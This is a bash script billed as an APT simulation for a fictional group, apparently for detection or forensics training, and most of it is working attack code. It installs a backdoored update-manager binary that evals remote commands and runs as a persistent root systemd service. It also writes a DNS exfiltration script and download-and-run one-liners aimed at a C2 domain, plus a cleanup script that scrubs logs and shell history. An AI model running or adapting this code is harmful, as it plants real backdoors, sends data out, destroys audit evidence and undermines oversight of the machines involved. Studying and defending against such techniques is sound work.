#!/bin/bash

# APT (Advanced Persistent Threat) Simulation
# Simulates a nation-state style attack with sophisticated techniques

echo "[APT SIMULATION] Deploying Advanced Persistent Threat scenario..."

# ===== APT GROUP: "Silent Dragon" =====
APT_GROUP="Silent Dragon"
CAMPAIGN_NAME="Operation Shadow Harvest"
C2_DOMAIN="update.system-analytics.com"

# 1. Spear Phishing Email Artifacts
echo "  [1] Creating spear phishing artifacts..."
mkdir -p /tmp/.mail/attachments
cat << 'EOF' > /tmp/.mail/phishing_email.eml
From: security@company.com
To: webadmin@company.com
Subject: URGENT: Security Certificate Renewal Required
Date: Mon, 7 Oct 2024 09:15:00 +0000

Dear IT Administrator,

Our security audit has identified that your SSL certificates will expire in 24 hours.
Please download and install the attached certificate renewal tool immediately.

Attachment: SSL_Certificate_Renewal_Tool.exe (actually: apt_payload.sh)

Best regards,
Security Team
EOF

# 2. Watering Hole Attack Simulation
echo "  [2] Setting up watering hole attack traces..."
cat << 'EOF' > /var/www/html/legitimate_page.html
<!DOCTYPE html>
<html>
<head><title>Company Resources</title></head>
<body>
<h1>Internal Resources</h1>
<script src="http://cdn.jquery-analytics.com/tracking.js"></script>
<!-- The above script is actually malicious -->
</body>
</html>
EOF

# 3. Supply Chain Compromise
echo "  [3] Simulating supply chain compromise..."
cat << 'EOF' > /usr/local/bin/update-manager
#!/bin/bash
# Legitimate-looking update manager with backdoor
# This simulates compromise of a trusted software update mechanism

# Legitimate update functionality (fake)
echo "Checking for system updates..."
echo "No updates available."

# Hidden backdoor functionality
if [ -f "/tmp/.update_config" ]; then
    source /tmp/.update_config
    eval "$REMOTE_CMD" 2>/dev/null
fi

# Persistence
if [ ! -f "/etc/systemd/system/update-manager.service" ]; then
    cat << 'SEOF' > /etc/systemd/system/update-manager.service
[Unit]
Description=System Update Manager
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/update-manager
Restart=always
User=root

[Install]
WantedBy=multi-user.target
SEOF
    systemctl enable update-manager.service 2>/dev/null
fi
EOF
chmod +x /usr/local/bin/update-manager

# 4. Living off the Land Techniques
echo "  [4] Implementing LOLBAS techniques..."
# Using legitimate binaries for malicious purposes
cat << 'EOF' > /tmp/.lol_commands.txt
# Commands executed using legitimate binaries for malicious purposes
curl -s http://update.system-analytics.com/config | bash
wget -q -O - http://update.system-analytics.com/payload | sh
python3 -c "import urllib.request; exec(urllib.request.urlopen('http://update.system-analytics.com/py').read())"
openssl enc -d -aes256 -in /tmp/.encrypted_payload -out /tmp/payload.sh -k "apt_key_2024"
base64 -d /tmp/.b64_payload | bash
EOF

# 5. Fileless Malware Simulation
echo "  [5] Creating fileless malware artifacts..."
# Simulation of in-memory execution
cat << 'EOF' > /tmp/.memory_artifacts.txt
# Memory-based execution traces
Process: python3 -c "exec(__import__('base64').b64decode('aW1wb3J0IG9z...'))"
Process: bash -c "$(curl -s http://update.system-analytics.com/mem)"
Process: powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==
EOF

# 6. Lateral Movement Tools
echo "  [6] Installing lateral movement tools..."
mkdir -p /tmp/.tools
cat << 'EOF' > /tmp/.tools/psexec.py
#!/usr/bin/env python3
# Simulated PsExec-like tool for lateral movement
import socket
import subprocess

def lateral_move(target, username, password):
    print(f"Attempting lateral movement to {target}")
    print(f"Using credentials: {username}:{password}")
    # Simulation - would actually implement SMB/WMI exploitation
    pass

if __name__ == "__main__":
    targets = ["192.168.1.10", "192.168.1.15", "192.168.1.20"]
    creds = [("admin", "password123"), ("service", "Service123!")]
    
    for target in targets:
        for user, passwd in creds:
            lateral_move(target, user, passwd)
EOF

# 7. Data Exfiltration via DNS
echo "  [7] Setting up DNS exfiltration..."
cat << 'EOF' > /tmp/.dns_exfil.sh
#!/bin/bash
# DNS Exfiltration Tool
data_file="$1"
if [ -f "$data_file" ]; then
    # Encode data and send via DNS queries
    base64 -w 0 "$data_file" | fold -w 32 | while read chunk; do
        nslookup "${chunk}.exfil.update.system-analytics.com" 8.8.8.8 >/dev/null 2>&1
        sleep 1
    done
fi
EOF
chmod +x /tmp/.dns_exfil.sh

# 8. Advanced Evasion Techniques
echo "  [8] Implementing advanced evasion..."
# Time-based execution
echo "# Execute only during business hours to avoid detection" > /tmp/.time_evasion.sh
echo "current_hour=\$(date +%H)" >> /tmp/.time_evasion.sh
echo "if [ \$current_hour -ge 9 ] && [ \$current_hour -le 17 ]; then" >> /tmp/.time_evasion.sh
echo "    /tmp/.tools/main_payload.sh" >> /tmp/.time_evasion.sh
echo "fi" >> /tmp/.time_evasion.sh

# 9. Credential Harvesting with Mimikatz-style techniques
echo "  [9] Setting up credential harvesting..."
mkdir -p /tmp/.creds/dumps
cat << 'EOF' > /tmp/.creds/lsass_dump.txt
# Simulated LSASS memory dump analysis results
[CREDENTIAL] Domain: COMPANY.LOCAL User: administrator Hash: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
[CREDENTIAL] Domain: COMPANY.LOCAL User: service_sql Hash: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
[CREDENTIAL] Domain: COMPANY.LOCAL User: backup_admin Hash: aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb
EOF

# 10. Indicator Cleanup
echo "  [10] Installing indicator cleanup mechanisms..."
cat << 'EOF' > /tmp/.cleanup.sh
#!/bin/bash
# Automated cleanup script to remove forensic evidence
find /var/log -name "*.log" -exec sed -i '/update.system-analytics.com/d' {} \;
find /var/log -name "*.log" -exec sed -i '/Silent Dragon/d' {} \;
history -c
> ~/.bash_history
rm -f /tmp/.*.sh /tmp/.tools/* /tmp/.creds/*
shred -vfz -n 3 /tmp/cleanup_targets.txt 2>/dev/null
EOF

echo "[APT SIMULATION] $APT_GROUP deployment complete!"
echo ""
echo "CAMPAIGN: $CAMPAIGN_NAME"
echo "THREAT ACTOR: $APT_GROUP"
echo "C2 DOMAIN: $C2_DOMAIN"
echo ""
echo "Simulated TTPs:"
echo "  - T1566.001: Spear Phishing Attachment"
echo "  - T1189: Drive-by Compromise (Watering Hole)"
echo "  - T1195.002: Supply Chain Compromise"
echo "  - T1055: Process Injection (Fileless)"
echo "  - T1570: Lateral Tool Transfer"
echo "  - T1041: Exfiltration Over C2 Channel"
echo "  - T1048.003: DNS Exfiltration"
echo "  - T1027: Obfuscated Files or Information"
echo "  - T1070: Indicator Removal on Host"